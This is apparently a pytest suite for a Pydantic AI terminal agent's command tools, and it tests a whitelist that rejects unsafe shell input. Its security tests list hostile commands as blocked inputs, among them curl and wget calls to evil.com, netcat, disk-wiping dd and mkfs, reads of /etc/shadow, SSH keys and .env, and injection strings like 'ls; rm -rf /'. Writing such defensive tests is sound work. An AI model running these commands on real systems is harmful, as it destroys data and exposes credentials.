"""
B079: Pydantic AI Agent 核心实现测试。

测试覆盖：
1. Agent 创建和配置验证
2. execute_command 工具：合法命令执行、非法命令拒绝、超时处理、Agent 离线处理
3. ask_user 工具：推送问题、获取回复
4. Result 格式：AgentResult 转化为 CommandSequence
5. 白名单安全验证（复用 command_validator 的 27 个攻击向量）
6. 多轮对话（message_history）
"""
import asyncio
from dataclasses import dataclass
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from app.command_validator import validate_command
from app.ws_agent import ExecuteCommandResult


# ---------------------------------------------------------------------------
# 由于 app 包的 __init__.py 会触发完整的 FastAPI 初始化链，
# 我们需要在导入 terminal_agent 之前确保环境变量已设置（conftest.py 已处理）。
# ---------------------------------------------------------------------------
from app.terminal_agent import (
    AgentDeps,
    AgentResult,
    AgentRunOutcome,
    CommandSequenceStep,
    SYSTEM_PROMPT,
    _build_model,
    execute_command,
    ask_user,
    call_dynamic_tool,
    build_session_agent,
    validate_tool_catalog,
    MAX_TOOLS_PER_SNAPSHOT,
    MAX_DESCRIPTION_LENGTH,
    MAX_SCHEMA_SIZE,
    run_agent,
    terminal_agent,
    lookup_knowledge,
)
from pydantic_ai import RunContext


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

def _make_execute_result(
    exit_code: int = 0,
    stdout: str = "",
    stderr: str = "",
    truncated: bool = False,
    timed_out: bool = False,
) -> ExecuteCommandResult:
    return ExecuteCommandResult(
        exit_code=exit_code,
        stdout=stdout,
        stderr=stderr,
        truncated=truncated,
        timed_out=timed_out,
    )


def _make_deps(
    execute_fn=None,
    ask_fn=None,
    lookup_knowledge_fn=None,
    tool_call_fn=None,
    dynamic_tools=None,
    session_id: str = "test-session",
    aliases: dict | None = None,
) -> AgentDeps:
    if execute_fn is None:
        execute_fn = AsyncMock(return_value=_make_execute_result(stdout="mock output"))
    if ask_fn is None:
        ask_fn = AsyncMock(return_value="user reply")
    return AgentDeps(
        session_id=session_id,
        execute_command_fn=execute_fn,
        ask_user_fn=ask_fn,
        lookup_knowledge_fn=lookup_knowledge_fn,
        tool_call_fn=tool_call_fn,
        dynamic_tools=dynamic_tools or [],
        project_aliases=aliases or {},
    )


def _make_run_context(deps: AgentDeps) -> RunContext[AgentDeps]:
    """创建一个最小化的 RunContext 用于直接测试 tool 函数。"""
    ctx = MagicMock(spec=RunContext)
    ctx.deps = deps
    return ctx


# ---------------------------------------------------------------------------
# Test: Agent 创建和配置验证
# ---------------------------------------------------------------------------

class TestAgentCreation:
    """测试 Agent 实例的配置是否正确。"""

    def test_agent_instance_exists(self):
        assert terminal_agent is not None

    def test_system_prompt_is_set(self):
        assert SYSTEM_PROMPT
        assert "决策优先级" in SYSTEM_PROMPT
        assert "自主探索" in SYSTEM_PROMPT
        assert "选项消歧" in SYSTEM_PROMPT

    def test_system_prompt_contains_security_constraints(self):
        """System prompt 应包含安全约束说明。"""
        assert "只读" in SYSTEM_PROMPT
        assert "不能执行写" in SYSTEM_PROMPT

    def test_build_model_returns_openai_model(self):
        model = _build_model()
        from pydantic_ai.models.openai import OpenAIModel
        assert isinstance(model, OpenAIModel)

    def test_agent_result_model(self):
        result = AgentResult(
            summary="test",
            steps=[CommandSequenceStep(id="step_1", label="cd", command="cd /home")],
        )
        assert result.summary == "test"
        assert len(result.steps) == 1
        assert result.provider == "agent"
        assert result.source == "recommended"
        assert result.need_confirm is True
        assert result.aliases == {}

    def test_command_sequence_step_model(self):
        step = CommandSequenceStep(id="s1", label="go", command="cd /project")
        assert step.id == "s1"
        assert step.command == "cd /project"

    def test_agent_deps_dataclass(self):
        deps = _make_deps()
        assert deps.session_id == "test-session"
        assert isinstance(deps.project_aliases, dict)

    def test_agent_deps_with_aliases(self):
        deps = _make_deps(aliases={"/home/user/project": "my-project"})
        assert deps.project_aliases["/home/user/project"] == "my-project"


# ---------------------------------------------------------------------------
# Test: execute_command 工具
# ---------------------------------------------------------------------------

class TestExecuteCommandTool:
    """测试 execute_command 工具的核心行为。"""

    @pytest.mark.asyncio
    async def test_valid_command_executes(self):
        """合法命令应成功执行并返回输出。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            stdout="file1.txt\nfile2.txt\n"
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls -la /home")
        assert "file1.txt" in result
        execute_fn.assert_called_once_with("test-session", "ls -la /home", None)

    @pytest.mark.asyncio
    async def test_valid_command_with_cwd(self):
        """带 cwd 的命令应传递工作目录。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(stdout="ok"))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls", cwd="/tmp")
        execute_fn.assert_called_once_with("test-session", "ls", "/tmp")

    @pytest.mark.asyncio
    async def test_invalid_command_rejected(self):
        """非法命令应被白名单拦截，不调用执行函数。"""
        execute_fn = AsyncMock()
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "rm -rf /")
        assert "错误" in result
        assert "被拒绝" in result
        execute_fn.assert_not_called()

    @pytest.mark.asyncio
    async def test_shell_meta_rejected(self):
        """shell 元字符应被拦截。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls; rm -rf /")
        assert "错误" in result
        assert "元字符" in result

    @pytest.mark.asyncio
    async def test_sensitive_path_rejected(self):
        """敏感路径应被拦截。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "cat /etc/shadow")
        assert "错误" in result
        assert "敏感路径" in result

    @pytest.mark.asyncio
    async def test_command_substitution_rejected(self):
        """命令替换应被拦截。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "echo $(whoami)")
        assert "错误" in result

    @pytest.mark.asyncio
    async def test_stderr_included_in_output(self):
        """stderr 应包含在输出中。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            stdout="stdout text",
            stderr="some warning",
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls")
        assert "stdout text" in result
        assert "[stderr] some warning" in result

    @pytest.mark.asyncio
    async def test_nonzero_exit_code_in_output(self):
        """非零退出码应体现在输出中。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            exit_code=1,
            stdout="error output",
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls")
        assert "[exit_code=1]" in result

    @pytest.mark.asyncio
    async def test_timeout_handling(self):
        """超时应返回超时信息。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            timed_out=True,
            exit_code=-1,
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls")
        assert "超时" in result

    @pytest.mark.asyncio
    async def test_no_output_returns_placeholder(self):
        """无输出应返回占位文本。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            stdout="",
            stderr="",
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls")
        assert "(无输出)" in result

    @pytest.mark.asyncio
    async def test_execution_exception_returns_error(self):
        """执行异常应返回错误信息而非抛出。"""
        execute_fn = AsyncMock(side_effect=ConnectionError("device offline"))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls")
        assert "错误" in result
        assert "ConnectionError" in result
        assert "device offline" in result

    @pytest.mark.asyncio
    async def test_generic_exception_returns_error(self):
        """通用异常应返回错误信息。"""
        execute_fn = AsyncMock(side_effect=RuntimeError("unexpected"))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls")
        assert "错误" in result
        assert "RuntimeError" in result


# ---------------------------------------------------------------------------
# Test: ask_user 工具
# ---------------------------------------------------------------------------

class TestAskUserTool:
    """测试 ask_user 工具的核心行为。"""

    @pytest.mark.asyncio
    async def test_ask_user_returns_reply(self):
        """ask_user 应返回用户的回复。"""
        ask_fn = AsyncMock(return_value="I want project A")
        deps = _make_deps(ask_fn=ask_fn)
        ctx = _make_run_context(deps)

        result = await ask_user(ctx, "Which project?")
        assert result == "I want project A"
        ask_fn.assert_called_once_with("Which project?", [], False)

    @pytest.mark.asyncio
    async def test_ask_user_with_options(self):
        """ask_user 应传递选项。"""
        ask_fn = AsyncMock(return_value="project-a")
        deps = _make_deps(ask_fn=ask_fn)
        ctx = _make_run_context(deps)

        result = await ask_user(
            ctx,
            "Select a project:",
            options=["project-a", "project-b"],
        )
        assert result == "project-a"
        ask_fn.assert_called_once_with(
            "Select a project:",
            ["project-a", "project-b"],
            False,
        )

    @pytest.mark.asyncio
    async def test_ask_user_with_multi_select(self):
        """ask_user 应传递 multi_select 标志。"""
        ask_fn = AsyncMock(return_value="option1, option2")
        deps = _make_deps(ask_fn=ask_fn)
        ctx = _make_run_context(deps)

        result = await ask_user(
            ctx,
            "Select multiple:",
            options=["option1", "option2", "option3"],
            multi_select=True,
        )
        assert result == "option1, option2"
        ask_fn.assert_called_once_with(
            "Select multiple:",
            ["option1", "option2", "option3"],
            True,
        )

    @pytest.mark.asyncio
    async def test_ask_user_none_options_defaults_to_empty(self):
        """options 为 None 时应默认为空列表。"""
        ask_fn = AsyncMock(return_value="text reply")
        deps = _make_deps(ask_fn=ask_fn)
        ctx = _make_run_context(deps)

        result = await ask_user(ctx, "What?", options=None)
        assert result == "text reply"
        ask_fn.assert_called_once_with("What?", [], False)


# ---------------------------------------------------------------------------
# Test: AgentResult 格式与 CommandSequence 兼容性
# ---------------------------------------------------------------------------

class TestAgentResultFormat:
    """测试 AgentResult 格式与 runtime_api 的 AssistantCommandSequence 兼容。"""

    def test_minimal_result(self):
        result = AgentResult(
            summary="cd to project and start claude",
            steps=[
                CommandSequenceStep(id="step_1", label="进入项目目录", command="cd /home/user/project"),
                CommandSequenceStep(id="step_2", label="启动 Claude", command="claude"),
            ],
        )
        assert result.summary
        assert len(result.steps) == 2
        assert result.provider == "agent"
        assert result.source == "recommended"
        assert result.need_confirm is True

    def test_result_with_aliases(self):
        result = AgentResult(
            summary="open project",
            steps=[CommandSequenceStep(id="s1", label="go", command="cd /app")],
            aliases={"/app": "my-app", "/app/v2": "my-app-v2"},
        )
        assert len(result.aliases) == 2
        assert result.aliases["/app"] == "my-app"

    def test_step_fields_match_assistant_command_step(self):
        """CommandSequenceStep 字段应与 runtime_api.AssistantCommandStep 对齐。"""
        step = CommandSequenceStep(id="step_1", label="test", command="pwd")
        # AssistantCommandStep 的字段：id, label, command
        assert hasattr(step, 'id')
        assert hasattr(step, 'label')
        assert hasattr(step, 'command')

    def test_empty_steps_valid(self):
        """空 steps 列表应该是合法的（agent 无法确定时）。"""
        result = AgentResult(
            summary="无法确定项目位置",
            steps=[],
        )
        assert result.steps == []

    def test_result_serialization(self):
        """AgentResult 应可序列化为 dict/JSON。"""
        result = AgentResult(
            summary="test",
            steps=[CommandSequenceStep(id="s1", label="go", command="cd /tmp")],
            aliases={"/tmp": "temp"},
        )
        data = result.model_dump()
        assert isinstance(data, dict)
        assert data["summary"] == "test"
        assert data["steps"][0]["command"] == "cd /tmp"
        assert data["aliases"]["/tmp"] == "temp"

    def test_result_from_dict(self):
        """AgentResult 应可从 dict 反序列化。"""
        data = {
            "summary": "hello",
            "steps": [{"id": "s1", "label": "go", "command": "pwd"}],
            "provider": "agent",
            "source": "recommended",
            "need_confirm": True,
            "aliases": {},
        }
        result = AgentResult(**data)
        assert result.summary == "hello"
        assert len(result.steps) == 1


# ---------------------------------------------------------------------------
# Test: 白名单安全验证（27 个攻击向量）
# ---------------------------------------------------------------------------

class TestSecurityAttackVectors:
    """复用 command_validator 的三重防护，验证 Agent 工具层也能拦截。

    这些测试直接调用 validate_command 来确保白名单一致性。
    与 test_command_validator.py 互补，确认 terminal_agent 工具层
    对命令的验证与 command_validator 完全一致。
    """

    # --- 白名单外命令（不在白名单的命令）---

    @pytest.mark.parametrize("malicious_cmd", [
        "rm -rf /",
        "sudo ls",
        "bash -c 'echo hi'",
        "python3 -c 'import os'",
        "curl http://evil.com",
        "wget http://evil.com",
        "ssh attacker@host",
        "nc -l 8080",
        "chmod 777 /etc/passwd",
        "mkdir /tmp/evil",
        "cp /etc/passwd /tmp",
        "mv /etc/hosts /tmp",
        "dd if=/dev/zero of=/dev/sda",
        "shutdown -h now",
        "reboot",
        "mkfs.ext4 /dev/sda",
    ])
    @pytest.mark.asyncio
    async def test_non_whitelisted_commands_blocked(self, malicious_cmd):
        """白名单外命令通过 execute_command 工具应被拒绝。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)
        result = await execute_command(ctx, malicious_cmd)
        assert "错误" in result, f"'{malicious_cmd}' 应被拦截"

    # --- Shell 元字符攻击 ---

    @pytest.mark.parametrize("meta_cmd", [
        "ls; rm -rf /",
        "ls | grep secret",
        "ls &",
        "echo $HOME",
        "echo `whoami`",
        "echo $(whoami)",
        "echo hi > /tmp/file",
        "echo hi >> /tmp/file",
    ])
    @pytest.mark.asyncio
    async def test_shell_meta_commands_blocked(self, meta_cmd):
        """shell 元字符命令通过 execute_command 工具应被拒绝。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)
        result = await execute_command(ctx, meta_cmd)
        assert "错误" in result, f"'{meta_cmd}' 应被拦截"

    # --- 敏感路径攻击 ---

    @pytest.mark.parametrize("sensitive_cmd", [
        "cat /etc/shadow",
        "ls /etc/ssh",
        "cat .ssh/id_rsa",
        "cat ~/.ssh/id_ed25519",
        "cat .ssh/known_hosts",
        "cat .ssh/authorized_keys",
        "cat .env",
        "cat server.key",
        "cat /proc/self/environ",
    ])
    @pytest.mark.asyncio
    async def test_sensitive_path_commands_blocked(self, sensitive_cmd):
        """敏感路径命令通过 execute_command 工具应被拒绝。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)
        result = await execute_command(ctx, sensitive_cmd)
        assert "错误" in result, f"'{sensitive_cmd}' 应被拦截"

    # --- Git 危险子命令 ---

    @pytest.mark.parametrize("git_cmd", [
        "git push",
        "git pull",
        "git checkout main",
        "git reset --hard",
        "git clean -fd",
        "git commit -m 'hack'",
    ])
    @pytest.mark.asyncio
    async def test_dangerous_git_commands_blocked(self, git_cmd):
        """git 危险子命令通过 execute_command 工具应被拒绝。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)
        result = await execute_command(ctx, git_cmd)
        assert "错误" in result, f"'{git_cmd}' 应被拦截"


# ---------------------------------------------------------------------------
# Test: run_agent 集成（mock 模型层）
# ---------------------------------------------------------------------------

class TestRunAgent:
    """测试 run_agent 公开接口（mock Agent.run）。"""

    @pytest.mark.asyncio
    async def test_run_agent_returns_agent_run_outcome(self):
        """run_agent 应返回 AgentRunOutcome 实例。"""
        mock_result = MagicMock()
        mock_result.output = AgentResult(
            summary="entered project",
            steps=[CommandSequenceStep(id="s1", label="go", command="cd /project")],
        )
        mock_usage = MagicMock()
        mock_usage.input_tokens = 100
        mock_usage.output_tokens = 50
        mock_usage.total_tokens = 150
        mock_usage.requests = 2
        mock_result.usage = MagicMock(return_value=mock_usage)

        with patch('pydantic_ai.Agent.run', new_callable=AsyncMock, return_value=mock_result):
            outcome = await run_agent(
                intent="进入 my-project",
                session_id="session-1",
                execute_command_fn=AsyncMock(),
                ask_user_fn=AsyncMock(),
            )

        assert isinstance(outcome, AgentRunOutcome)
        assert isinstance(outcome.result, AgentResult)
        assert outcome.result.summary == "entered project"
        assert len(outcome.result.steps) == 1
        assert outcome.input_tokens == 100
        assert outcome.output_tokens == 50
        assert outcome.total_tokens == 150
        assert outcome.requests == 2
        assert outcome.model_name != ""  # planner_model() 应返回非空字符串

    @pytest.mark.asyncio
    async def test_run_agent_passes_deps_correctly(self):
        """run_agent 应正确构建并传递 AgentDeps。"""
        mock_result = MagicMock()
        mock_result.output = AgentResult(
            summary="ok",
            steps=[CommandSequenceStep(id="s1", label="go", command="pwd")],
        )
        mock_result.usage = MagicMock(return_value=MagicMock(
            input_tokens=0, output_tokens=0, total_tokens=0, requests=0,
        ))

        execute_fn = AsyncMock()
        ask_fn = AsyncMock()
        aliases = {"/app": "my-app"}

        with patch('pydantic_ai.Agent.run', new_callable=AsyncMock, return_value=mock_result) as mock_run:
            await run_agent(
                intent="打开项目",
                session_id="sess-1",
                execute_command_fn=execute_fn,
                ask_user_fn=ask_fn,
                project_aliases=aliases,
            )

            call_kwargs = mock_run.call_args
            deps = call_kwargs.kwargs.get('deps') or call_kwargs[1].get('deps')
            assert deps.session_id == "sess-1"
            assert deps.project_aliases == aliases

    @pytest.mark.asyncio
    async def test_run_agent_with_message_history(self):
        """run_agent 应传递 message_history。"""
        mock_result = MagicMock()
        mock_result.output = AgentResult(
            summary="ok",
            steps=[],
        )
        mock_result.usage = MagicMock(return_value=MagicMock(
            input_tokens=0, output_tokens=0, total_tokens=0, requests=0,
        ))

        history = [{"role": "user", "content": "之前说打开 project-a"}]

        with patch('pydantic_ai.Agent.run', new_callable=AsyncMock, return_value=mock_result) as mock_run:
            await run_agent(
                intent="现在打开 project-b",
                session_id="sess-1",
                execute_command_fn=AsyncMock(),
                ask_user_fn=AsyncMock(),
                message_history=history,
            )

            call_kwargs = mock_run.call_args
            assert call_kwargs.kwargs.get('message_history') == history or \
                   call_kwargs[1].get('message_history') == history

    @pytest.mark.asyncio
    async def test_run_agent_defaults_aliases_to_empty(self):
        """project_aliases 默认应为空 dict。"""
        mock_result = MagicMock()
        mock_result.output = AgentResult(summary="ok", steps=[])
        mock_result.usage = MagicMock(return_value=MagicMock(
            input_tokens=0, output_tokens=0, total_tokens=0, requests=0,
        ))

        with patch('pydantic_ai.Agent.run', new_callable=AsyncMock, return_value=mock_result) as mock_run:
            await run_agent(
                intent="test",
                session_id="s1",
                execute_command_fn=AsyncMock(),
                ask_user_fn=AsyncMock(),
            )

            deps = mock_run.call_args.kwargs.get('deps')
            assert deps.project_aliases == {}

    @pytest.mark.asyncio
    async def test_run_agent_defaults_history_to_none(self):
        """message_history 默认应为 None。"""
        mock_result = MagicMock()
        mock_result.output = AgentResult(summary="ok", steps=[])
        mock_result.usage = MagicMock(return_value=MagicMock(
            input_tokens=0, output_tokens=0, total_tokens=0, requests=0,
        ))

        with patch('pydantic_ai.Agent.run', new_callable=AsyncMock, return_value=mock_result) as mock_run:
            await run_agent(
                intent="test",
                session_id="s1",
                execute_command_fn=AsyncMock(),
                ask_user_fn=AsyncMock(),
            )

            msg_history = mock_run.call_args.kwargs.get('message_history')
            assert msg_history is None


# ---------------------------------------------------------------------------
# Test: execute_command 在 agent 上下文中的综合行为
# ---------------------------------------------------------------------------

class TestExecuteCommandComprehensive:
    """测试 execute_command 在各种执行结果下的行为。"""

    @pytest.mark.asyncio
    async def test_combined_stdout_stderr_exitcode(self):
        """stdout + stderr + 非零 exit_code 的组合输出。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            exit_code=2,
            stdout="some output",
            stderr="error message",
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "grep pattern missing-file")
        assert "some output" in result
        assert "[stderr] error message" in result
        assert "[exit_code=2]" in result

    @pytest.mark.asyncio
    async def test_only_stderr_no_stdout(self):
        """只有 stderr 没有 stdout。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            exit_code=1,
            stdout="",
            stderr="No such file",
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "ls /nonexistent")
        assert "[stderr] No such file" in result
        assert "[exit_code=1]" in result

    @pytest.mark.asyncio
    async def test_timeout_with_partial_stdout(self):
        """超时但有部分 stdout。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            exit_code=-1,
            stdout="partial output...",
            stderr="",
            timed_out=True,
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "find / -name '*.log'")
        assert "超时" in result

    @pytest.mark.asyncio
    async def test_git_status_passes(self):
        """git status 应该通过并返回结果。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            stdout="On branch main\nnothing to commit\n"
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "git status")
        assert "On branch main" in result
        execute_fn.assert_called_once()

    @pytest.mark.asyncio
    async def test_find_with_name_passes(self):
        """find -name 应该通过。"""
        execute_fn = AsyncMock(return_value=_make_execute_result(
            stdout="./project-a\n./project-b\n"
        ))
        deps = _make_deps(execute_fn=execute_fn)
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "find . -name 'package.json' -maxdepth 3")
        assert "project-a" in result

    @pytest.mark.asyncio
    async def test_find_exec_blocked(self):
        """find -exec 应被拦截。"""
        deps = _make_deps()
        ctx = _make_run_context(deps)

        result = await execute_command(ctx, "find . -name '*.tmp' -exec rm {} +")
        assert "错误" in result


# ---------------------------------------------------------------------------
# S085: Prompt 增强 + lookup_knowledge + 动态工具测试
# ---------------------------------------------------------------------------

class TestS085PromptKnowledge:
    """S085: SYSTEM_PROMPT 知识增强验证。"""

    def test_system_prompt_contains_lookup_knowledge(self):
        """SYSTEM_PROMPT 包含 lookup_knowledge 工具描述。"""
        assert "lookup_knowledge" in SYSTEM_PROMPT

    def test_system_prompt_contains_claude_code_mapping(self):
        """SYSTEM_PROMPT 包含 Claude Code 命令映射。"""
        assert "claude" in SYSTEM_PROMPT.lower()
        assert "Claude Code" in SYSTEM_PROMPT

    def test_system_prompt_codex_info_only(self):
        """SYSTEM_PROMPT 明确 Codex 仅 info-only，不生成执行命令。"""
        assert "Codex" in SYSTEM_PROMPT
        assert "info-only" in SYSTEM_PROMPT
        # 明确禁止生成 codex 命令
        assert "不生成" in SYSTEM_PROMPT and "codex" in SYSTEM_PROMPT.lower()

    def test_system_prompt_codex_negative_case(self):
        """SYSTEM_PROMPT 负向约束：用户说'用 Codex 打开项目'应被 info-only 规则覆盖。"""
        # 应包含明确的禁止规则
        assert any(phrase in SYSTEM_PROMPT for phrase in
                   ["不生成 `codex` 执行命令", "不生成 codex", "禁止生成 codex"])

    def test_system_prompt_contains_user_journeys(self):
        """SYSTEM_PROMPT 定义了用户旅程边界。"""
        assert "信息型问答" in SYSTEM_PROMPT
        assert "编程意图" in SYSTEM_PROMPT

    def test_system_prompt_info_only_steps_empty(self):
        """SYSTEM_PROMPT 明确信息型问答 steps=[]。"""
        # 检查 journeys section 中有 steps=[] 的描述
        assert '"steps": []' in SYSTEM_PROMPT

    def test_system_prompt_contains_which_verification(self):
        """SYSTEM_PROMPT 包含 which 验证工作流。"""
        assert "which" in SYSTEM_PROMPT


class TestS085LookupKnowledgeTool:
    """S085: lookup_knowledge 工具测试。"""

    @pytest.mark.asyncio
    async def test_lookup_knowledge_with_fn(self):
        """有回调时正确调用并返回结果。"""
        mock_fn = AsyncMock(return_value="Claude Code 使用技巧：...")
        deps = _make_deps(lookup_knowledge_fn=mock_fn)
        ctx = _make_run_context(deps)

        result = await lookup_knowledge(ctx, "Claude Code")
        assert "Claude Code" in result
        mock_fn.assert_called_once_with("Claude Code")

    @pytest.mark.asyncio
    async def test_lookup_knowledge_without_fn(self):
        """无回调时返回空字符串（降级）。"""
        deps = _make_deps(lookup_knowledge_fn=None)
        ctx = _make_run_context(deps)

        result = await lookup_knowledge(ctx, "Claude Code")
        assert result == ""

    @pytest.mark.asyncio
    async def test_lookup_knowledge_fn_error(self):
        """回调异常时返回空字符串（降级）。"""
        mock_fn = AsyncMock(side_effect=RuntimeError("fail"))
        deps = _make_deps(lookup_knowledge_fn=mock_fn)
        ctx = _make_run_context(deps)

        result = await lookup_knowledge(ctx, "test")
        assert result == ""


class TestS085RunAgentWithKnowledge:
    """S085: run_agent 传入 lookup_knowledge_fn 测试。"""

    @pytest.mark.asyncio
    async def test_run_agent_passes_lookup_knowledge_fn(self):
        """run_agent 正确将 lookup_knowledge_fn 传入 AgentDeps。"""
        with patch('pydantic_ai.Agent.run', new_callable=AsyncMock) as mock_run:
            mock_usage = MagicMock()
            mock_usage.input_tokens = 100
            mock_usage.output_tokens = 50
            mock_usage.total_tokens = 150
            mock_usage.requests = 1
            mock_run.return_value = MagicMock(
                output=AgentResult(
                    summary="test",
                    steps=[],
                    need_confirm=False,
                ),
                usage=mock_usage,
            )

            mock_lookup_fn = AsyncMock(return_value="知识内容")
            result = await run_agent(
                intent="test",
                session_id="s1",
                execute_command_fn=AsyncMock(),
                ask_user_fn=AsyncMock(),
                lookup_knowledge_fn=mock_lookup_fn,
            )

            assert isinstance(result, AgentRunOutcome)
            # 验证 deps 中包含了 lookup_knowledge_fn
            call_args = mock_run.call_args
            assert call_args.kwargs.get("deps").lookup_knowledge_fn == mock_lookup_fn

    @pytest.mark.asyncio
    async def test_run_agent_without_lookup_knowledge_fn(self):
        """run_agent 不传 lookup_knowledge_fn 时默认为 None。"""
        with patch('pydantic_ai.Agent.run', new_callable=AsyncMock) as mock_run:
            mock_usage = MagicMock(
                input_tokens=0, output_tokens=0, total_tokens=0, requests=1,
            )
            mock_run.return_value = MagicMock(
                output=AgentResult(summary="test", steps=[], need_confirm=False),
                usage=mock_usage,
            )

            await run_agent(
                intent="test",
                session_id="s1",
                execute_command_fn=AsyncMock(),
                ask_user_fn=AsyncMock(),
            )

            call_args = mock_run.call_args
            assert call_args.kwargs.get("deps").lookup_knowledge_fn is None


class TestCallDynamicTool:
    """B093: call_dynamic_tool 工具测试。"""

    @pytest.mark.asyncio
    async def test_call_dynamic_tool_with_fn(self):
        """有回调时正确调用并返回结果。"""
        mock_fn = AsyncMock(return_value={"status": "success", "result": "工具执行结果"})
        deps = _make_deps(tool_call_fn=mock_fn)
        ctx = _make_run_context(deps)

        result = await call_dynamic_tool(ctx, "my_skill.my_tool", {"arg1": "value1"})
        assert "工具执行结果" in result
        mock_fn.assert_called_once_with("my_skill.my_tool", {"arg1": "value1"})

    @pytest.mark.asyncio
    async def test_call_dynamic_tool_without_fn(self):
        """无回调时返回降级消息。"""
        deps = _make_deps(tool_call_fn=None)
        ctx = _make_run_context(deps)

        result = await call_dynamic_tool(ctx, "my_skill.my_tool", {})
        assert "不可用" in result

    @pytest.mark.asyncio
    async def test_call_dynamic_tool_error_response(self):
        """工具返回错误时显示错误消息。"""
        mock_fn = AsyncMock(return_value={"status": "error", "error": "工具不存在"})
        deps = _make_deps(tool_call_fn=mock_fn)
        ctx = _make_run_context(deps)

        result = await call_dynamic_tool(ctx, "bad.tool", {})
        assert "工具不存在" in result

    @pytest.mark.asyncio
    async def test_call_dynamic_tool_fn_exception(self):
        """回调异常时返回错误消息。"""
        mock_fn = AsyncMock(side_effect=RuntimeError("连接失败"))
        deps = _make_deps(tool_call_fn=mock_fn)
        ctx = _make_run_context(deps)

        result = await call_dynamic_tool(ctx, "tool", {})
        assert "连接失败" in result


class TestRunAgentWithDynamicTools:
    """B093: run_agent 传入 dynamic_tools 测试。"""

    @pytest.mark.asyncio
    async def test_run_agent_registers_dynamic_tools_on_agent(self):
        """run_agent 将 dynamic_tools 注册为真实 Pydantic AI tool（session-scoped factory）。"""
        with patch('pydantic_ai.Agent.run', new_callable=AsyncMock) as mock_run:
            mock_usage = MagicMock(
                input_tokens=0, output_tokens=0, total_tokens=0, requests=1,
            )
            mock_run.return_value = MagicMock(
                output=AgentResult(summary="test", steps=[], need_confirm=False),
                usage=mock_usage,
            )

            tools = [
                {"name": "my_skill.read_file", "description": "读取文件内容"},
            ]
            await run_agent(
                intent="测试意图",
                session_id="s1",
                execute_command_fn=AsyncMock(),
                ask_user_fn=AsyncMock(),
                dynamic_tools=tools,
                tool_call_fn=AsyncMock(return_value={"status": "success", "result": "ok"}),
            )

            mock_run.assert_awaited_once()

    @pytest.mark.asyncio
    async def test_run_agent_passes_tool_call_fn_to_deps(self):
        """run_agent 将 tool_call_fn 传入 AgentDeps。"""
        with patch('pydantic_ai.Agent.run', new_callable=AsyncMock) as mock_run:
            mock_usage = MagicMock(
                input_tokens=0, output_tokens=0, total_tokens=0, requests=1,
            )
            mock_run.return_value = MagicMock(
                output=AgentResult(summary="test", steps=[], need_confirm=False),
                usage=mock_usage,
            )

            mock_tool_fn = AsyncMock(return_value={"status": "success", "result": "ok"})
            await run_agent(
                intent="test",
                session_id="s1",
                execute_command_fn=AsyncMock(),
                ask_user_fn=AsyncMock(),
                tool_call_fn=mock_tool_fn,
                dynamic_tools=[{"name": "t1", "description": "d1"}],
            )

            call_args = mock_run.call_args
            deps = call_args.kwargs.get("deps")
            assert deps.tool_call_fn == mock_tool_fn
            assert len(deps.dynamic_tools) == 1

    @pytest.mark.asyncio
    async def test_dynamic_tools_excludes_builtin(self):
        """run_agent 不应将 kind=builtin 工具注入 dynamic_tools。"""
        with patch('pydantic_ai.Agent.run', new_callable=AsyncMock) as mock_run:
            mock_usage = MagicMock(
                input_tokens=0, output_tokens=0, total_tokens=0, requests=1,
            )
            mock_run.return_value = MagicMock(
                output=AgentResult(summary="test", steps=[], need_confirm=False),
                usage=mock_usage,
            )

            mixed_tools = [
                {"name": "lookup_knowledge", "kind": "builtin", "description": "知识检索"},
                {"name": "my_skill.tool1", "kind": "dynamic", "description": "扩展工具"},
            ]
            # 模拟 runtime_api 的过滤逻辑
            dynamic_only = [t for t in mixed_tools if t.get("kind") == "dynamic"]

            await run_agent(
                intent="test",
                session_id="s1",
                execute_command_fn=AsyncMock(),
                ask_user_fn=AsyncMock(),
                dynamic_tools=dynamic_only,
            )

            call_args = mock_run.call_args
            deps = call_args.kwargs.get("deps")
            assert len(deps.dynamic_tools) == 1
